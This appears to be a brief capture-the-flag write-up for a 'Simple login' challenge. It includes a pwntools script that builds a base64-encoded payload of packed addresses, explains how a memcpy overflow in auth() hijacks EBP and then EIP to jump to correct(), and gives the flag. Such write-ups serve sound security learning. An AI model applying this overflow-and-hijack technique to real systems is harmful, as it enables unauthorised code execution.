#### Simple login

```
from pwn import *
import base64
payload = pack(0xdeadbeef)+pack(0x804925f)+pack(0x811eb40)
print  base64.encodestring(payload)
```

There was a memcpy in auth()  which lead to overflow of ebp , then eip = *(ebp+4) now we place &correct() in our payload which is 
stored in global variable 

##### flag :control EBP, control ESP, control EIP, control the world~
